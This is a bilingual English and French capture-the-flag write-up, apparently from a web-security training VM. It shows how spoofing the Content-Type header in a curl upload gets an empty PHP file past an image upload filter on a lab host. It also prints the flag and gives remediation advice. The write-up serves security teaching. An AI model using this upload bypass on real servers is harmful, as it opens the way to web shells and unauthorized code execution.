<div align="center">

# Content-Type - Upload Image
### Bypassing file upload restrictions by spoofing Content-Type

</div>

---

## 🇬🇧 English

<details>
<summary><b>📖 Click to expand/collapse English version</b></summary>

### 📖 Definition

**Content-Type Spoofing** occurs when an attacker manipulates the HTTP `Content-Type` header to incorrectly describe the data being sent to the server. In file upload vulnerabilities, this is used to trick the server into accepting prohibited file types (like executable PHP scripts) by disguising them as safe types (like JPEGs).

### ⚡ Quick Demo

```bash
touch test.php
curl -X POST -F "Upload=Upload" -F "uploaded=@test.php;type=image/jpeg" "http://X.X.X.X/?page=upload"
```

### 📖 Approach

For this vulnerability, I found an image upload form. I tried uploading a PHP file, but it was rejected. I realized the server might be checking the MIME type sent by the browser. Since I couldn't easily change this in the browser interface for a `.php` file, I used `curl`.

I constructed a POST request to upload a PHP file but manually set the `Content-Type` of the file part to `image/jpeg`. The server accepted the file because it trusted the header, allowing me to upload the malicious script.

**Command used** (the `touch test.php` step is required — `curl` needs a local file to attach, an empty file is enough since the server never checks the content, only the extension and header):

```bash
touch test.php
curl -X POST -F "Upload=Upload" -F "uploaded=@test.php;type=image/jpeg" http://192.168.56.101/?page=upload
```

**Explanation:**
- `-X POST`: Specifies the request method.
- `-F "Upload=Upload"`: Simulates the submit button.
- `-F "uploaded=@test.php;type=image/jpeg"`: Uploads `test.php` but tells the server it is an `image/jpeg`.

```html
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
```

**Flag:** `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

### 💥 Impact

Uploading and getting an arbitrary PHP file executed on the server is one of the most critical impacts possible: it gives the attacker a **web shell**, i.e. arbitrary code execution with the privileges of the web server. From there, an attacker can read and modify any file the server can access, dump the database, pivot to other internal services, install persistence (backdoors), or use the compromised host as a foothold to attack the rest of the infrastructure.

### 🛡️ Remediation

To prevent this vulnerability:
- **Verify Magic Bytes**: Check the file's actual content (magic numbers) to determine its type, not just the Content-Type header or extension.
- **Rename Uploaded Files**: Store uploaded files with a generated name and a safe extension to prevent execution of scripts.
- **Store Outside Web Root**: If possible, store files in a directory that is not directly accessible via the web server.

### 🔗 Resources

- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

</details>

---

## 🇫🇷 Français

<details>
<summary><b>📖 Cliquez pour développer/réduire la version française</b></summary>

### 📖 Définition

Le **Content-Type Spoofing** se produit lorsqu'un attaquant manipule l'en-tête HTTP `Content-Type` pour décrire incorrectement les données envoyées au serveur. Dans les failles d'upload de fichiers, cela est utilisé pour tromper le serveur et lui faire accepter des types de fichiers interdits (comme des scripts PHP exécutables) en les déguisant en types sûrs (comme des images JPEG).

### ⚡ Démo rapide

```bash
touch test.php
curl -X POST -F "Upload=Upload" -F "uploaded=@test.php;type=image/jpeg" "http://X.X.X.X/?page=upload"
```

### 📖 Approche

Pour cette faille, j'ai trouvé un formulaire d'envoi d'images. J'ai tenté d'envoyer un fichier PHP, mais il a été refusé. J'ai compris que le serveur vérifiait probablement le type MIME envoyé par le navigateur. Comme il est difficile de modifier cela via l'interface standard pour un fichier `.php`, j'ai utilisé `curl`.

J'ai construit une requête POST pour envoyer mon fichier PHP tout en spécifiant manuellement que son `Content-Type` était `image/jpeg`. Le serveur, faisant confiance à l'en-tête, a accepté le fichier.

**Commande utilisée** (l'étape `touch test.php` est nécessaire — `curl` a besoin d'un fichier local à joindre, un fichier vide suffit puisque le serveur ne vérifie jamais le contenu, seulement l'extension et l'en-tête) :

```bash
touch test.php
curl -X POST -F "Upload=Upload" -F "uploaded=@test.php;type=image/jpeg" http://192.168.56.101/?page=upload
```

**Explication :**
- `-X POST`: Méthode HTTP.
- `-F "Upload=Upload"`: Simule le bouton d'envoi.
- `-F "uploaded=@test.php;type=image/jpeg"`: Envoie le fichier `test.php` mais indique au serveur que c'est une image JPEG (`image/jpeg`).

```html
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/test.php succesfully uploaded.</pre>
```

**Flag :** `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

### 💥 Impact

Réussir à uploader puis exécuter un fichier PHP arbitraire sur le serveur est l'un des impacts les plus critiques possibles : cela donne à l'attaquant un **web shell**, c'est-à-dire une exécution de code arbitraire avec les privilèges du serveur web. À partir de là, il peut lire et modifier tout fichier accessible par le serveur, extraire la base de données, rebondir vers d'autres services internes, installer une persistance (backdoor), ou utiliser la machine compromise comme point d'appui pour attaquer le reste de l'infrastructure.

### 🛡️ Remédiation

Pour corriger cela :
- **Vérifier les Magic Bytes** : Analyser le contenu réel du fichier (signature binaire) pour déterminer son type, et ne pas se fier à l'extension ou au Content-Type.
- **Renommer les fichiers** : Stocker les fichiers avec un nom généré aléatoirement et une extension sûre.
- **Stocker hors racine web** : Si possible, stocker les fichiers dans un dossier non accessible directement par le serveur web.

### 🔗 Sources

- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

</details>
